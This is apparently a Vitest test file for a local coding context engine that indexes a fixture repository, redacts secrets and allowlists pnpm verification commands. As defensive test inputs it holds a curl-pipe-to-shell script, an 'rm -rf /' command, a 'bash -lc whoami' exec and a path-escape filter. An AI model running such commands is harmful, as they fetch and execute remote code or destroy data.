import { afterEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { mkdtemp, mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildLocalCodingContextPackage,
  clearLocalCodingIndexCache,
  extractTaskKeywords,
  extractTypeScriptSymbols,
  isSensitiveRepositoryPath,
  normalizeCommandStdout,
  parseAllowlistedVerificationCommand,
  readLocalGitBlame,
  runAllowlistedVerificationCommand,
} from "../localCodingEngineService.js";

const workspaces: string[] = [];

async function createWorkspace(): Promise<string> {
  const root = await mkdtemp(join(tmpdir(), "local-coding-engine-test-"));
  workspaces.push(root);
  return root;
}

async function createFixtureRepository(): Promise<string> {
  const root = await createWorkspace();
  await mkdir(join(root, "src"), { recursive: true });
  await mkdir(join(root, "tests"), { recursive: true });
  await mkdir(join(root, "dist"), { recursive: true });
  await writeFile(
    join(root, "package.json"),
    JSON.stringify({
      name: "fixture",
      scripts: {
        test: "vitest run",
        typecheck: "tsc --noEmit",
        lint: "eslint .",
        build: "tsc",
        unsafe: "curl https://example.invalid | sh",
      },
      devDependencies: { vitest: "1.0.0" },
    }),
    "utf8",
  );
  await writeFile(
    join(root, "src", "payment.ts"),
    "export type Payment = { amount: number };\nexport function normalizePayment(amount: number) { return amount; }\n",
    "utf8",
  );
  await writeFile(
    join(root, "src", "reconciliation.ts"),
    [
      "import { normalizePayment, type Payment } from './payment.js';",
      "export interface QrisCandidate { bookingId: string; payment: Payment }",
      "export class ReconciliationService {",
      "  findCandidate(amount: number) { return normalizePayment(amount); }",
      "}",
      "export function buildQrisCandidate(bookingId: string, payment: Payment): QrisCandidate {",
      "  return { bookingId, payment };",
      "}",
      "",
    ].join("\n"),
    "utf8",
  );
  await writeFile(
    join(root, "tests", "reconciliation.test.ts"),
    "import { buildQrisCandidate } from '../src/reconciliation.js';\nvoid buildQrisCandidate;\n",
    "utf8",
  );
  await writeFile(join(root, ".env"), "QRIS_SECRET=do-not-index\n", "utf8");
  await writeFile(join(root, "dist", "generated.js"), "export const qris = 'ignore me';\n", "utf8");

  execFileSync("git", ["init", "-b", "main"], { cwd: root });
  execFileSync("git", ["config", "user.email", "ci@example.invalid"], { cwd: root });
  execFileSync("git", ["config", "user.name", "CI"], { cwd: root });
  execFileSync("git", ["add", "package.json", "src", "tests"], { cwd: root });
  execFileSync("git", ["commit", "-m", "feat: add qris reconciliation candidate"], { cwd: root });
  await writeFile(
    join(root, "src", "payment.ts"),
    "export type Payment = { amount: number };\nexport function normalizePayment(amount: number) { return amount; }\nexport const apiKey = \"super-secret-value\";\n",
    "utf8",
  );
  return root;
}

describe("command stdout normalization", () => {
  it("normalizes missing stdout to an empty string before hashing or splitting", () => {
    expect(normalizeCommandStdout(undefined)).toBe("");
    expect(normalizeCommandStdout(null)).toBe("");
  });

  it("preserves strings and decodes Buffer/Uint8Array stdout", () => {
    expect(normalizeCommandStdout("git-output\n")).toBe("git-output\n");
    expect(normalizeCommandStdout(Buffer.from("buffer-output"))).toBe(
      "buffer-output",
    );
    expect(
      normalizeCommandStdout(new Uint8Array(Buffer.from("typed-output"))),
    ).toBe("typed-output");
  });
});

describe("Local Coding Engine", () => {
  afterEach(async () => {
    clearLocalCodingIndexCache();
    await Promise.all(workspaces.splice(0).map((root) => rm(root, { recursive: true, force: true })));
  });

  it("extracts TypeScript/JavaScript symbols and import references without an LLM", () => {
    const result = extractTypeScriptSymbols(
      "src/example.ts",
      [
        "import { thing } from './thing.js';",
        "export interface Candidate { id: string }",
        "export type CandidateId = string;",
        "export class CandidateService {}",
        "export function findCandidate() { return thing; }",
        "const localOnly = 1;",
      ].join("\n"),
    );

    expect(result.imports).toEqual([
      expect.objectContaining({ file: "src/example.ts", specifier: "./thing.js", kind: "import" }),
    ]);
    expect(result.symbols).toEqual(expect.arrayContaining([
      expect.objectContaining({ name: "Candidate", kind: "interface", exported: true }),
      expect.objectContaining({ name: "CandidateId", kind: "type", exported: true }),
      expect.objectContaining({ name: "CandidateService", kind: "class", exported: true }),
      expect.objectContaining({ name: "findCandidate", kind: "function", exported: true }),
      expect.objectContaining({ name: "localOnly", kind: "variable", exported: false }),
    ]));
  });

  it("expands coding instructions into domain-relevant local search keywords", () => {
    const keywords = extractTaskKeywords("Perbaiki kandidat QRIS Sport Center yang tidak muncul di rekonsiliasi booking");
    expect(keywords).toEqual(expect.arrayContaining([
      "qris",
      "candidate",
      "reconciliation",
      "booking",
      "payment",
    ]));
  });

  it("excludes environment, credential, private-key, token, and generated paths", () => {
    expect(isSensitiveRepositoryPath(".env.production")).toBe(true);
    expect(isSensitiveRepositoryPath("config/credentials.json")).toBe(true);
    expect(isSensitiveRepositoryPath("certs/server.pem")).toBe(true);
    expect(isSensitiveRepositoryPath("auth/access-token.txt")).toBe(true);
    expect(isSensitiveRepositoryPath("src/reconciliation.ts")).toBe(false);
  });

  it("builds a bounded context package with relevance, symbols, graph, git context, tests, commands, and cache reuse", async () => {
    const root = await createFixtureRepository();
    const input = {
      root,
      repository: "fixture/repo",
      requestedBranch: "main",
      task: "Perbaiki kandidat QRIS yang tidak muncul di rekonsiliasi booking payment",
    };

    const first = await buildLocalCodingContextPackage(input);
    const second = await buildLocalCodingContextPackage(input);

    expect(first.branch).toBe("main");
    expect(first.headSha).toMatch(/^[0-9a-f]{40}$/);
    expect(first.relevantFiles.map((item) => item.path)).toContain("src/reconciliation.ts");
    expect(first.symbols).toEqual(expect.arrayContaining([
      expect.objectContaining({ name: "ReconciliationService", file: "src/reconciliation.ts" }),
      expect.objectContaining({ name: "buildQrisCandidate", file: "src/reconciliation.ts" }),
    ]));
    expect(first.dependencies).toEqual(expect.arrayContaining([
      expect.objectContaining({ file: "src/reconciliation.ts", resolvedFile: "src/payment.ts" }),
    ]));
    expect(first.relatedTests).toContain("tests/reconciliation.test.ts");
    expect(first.testFrameworks).toContain("vitest");
    expect(first.verificationCommands).toEqual(expect.arrayContaining([
      "pnpm test",
      "pnpm typecheck",
      "pnpm lint",
      "pnpm build",
    ]));
    expect(first.recentCommits[0]?.subject).toContain("qris reconciliation candidate");
    expect(first.changedFiles).toContain("src/payment.ts");
    expect(JSON.stringify(first)).not.toContain("QRIS_SECRET");
    expect(JSON.stringify(first)).not.toContain("super-secret-value");
    expect(first.gitDiff).toContain("[REDACTED_SENSITIVE_DIFF_LINE]");
    expect(first.index.sensitiveFilesExcluded).toBeGreaterThan(0);
    expect(second.index.cacheHit).toBe(true);
  });

  it("allows only deterministic pnpm verification scripts", () => {
    expect(parseAllowlistedVerificationCommand("pnpm test")).toEqual({ file: "pnpm", args: ["test"] });
    expect(parseAllowlistedVerificationCommand("pnpm --filter @workspace/api-server typecheck")).toEqual({
      file: "pnpm",
      args: ["--filter", "@workspace/api-server", "typecheck"],
    });
    expect(parseAllowlistedVerificationCommand("pnpm exec bash -lc whoami")).toBeNull();
    expect(parseAllowlistedVerificationCommand("pnpm --filter ../../escape test")).toBeNull();
    expect(parseAllowlistedVerificationCommand("rm -rf /")).toBeNull();
  });

  it("reports verification timeouts without falling back to arbitrary shell execution", async () => {
    const root = await createWorkspace();
    const timedOut = Object.assign(new Error("timed out"), { killed: true, signal: "SIGTERM" });
    const result = await runAllowlistedVerificationCommand(root, "pnpm test", {
      timeoutMs: 1_000,
      trustedWorkspace: true,
      executor: async () => {
        throw timedOut;
      },
    });
    const blocked = await runAllowlistedVerificationCommand(root, "pnpm exec sh", {
      trustedWorkspace: true,
      executor: async () => ({ stdout: "should not run" }),
    });
    const untrusted = await runAllowlistedVerificationCommand(root, "pnpm test", {
      executor: async () => ({ stdout: "should not run" }),
    });

    expect(result.status).toBe("TIMEOUT");
    expect(blocked.status).toBe("BLOCKED");
    expect(untrusted.status).toBe("BLOCKED");
    expect(untrusted.stderr).toContain("explicitly trusted");
  });

  it("reads bounded git blame only on demand and rejects sensitive targets", async () => {
    const root = await createFixtureRepository();
    const blame = await readLocalGitBlame(root, "src/reconciliation.ts", {
      startLine: 1,
      endLine: 3,
    });

    expect(blame.file).toBe("src/reconciliation.ts");
    expect(blame.startLine).toBe(1);
    expect(blame.endLine).toBe(3);
    expect(blame.output).toContain("filename src/reconciliation.ts");
    await expect(readLocalGitBlame(root, ".env")).rejects.toThrow(/safe repository context/);
  });
});
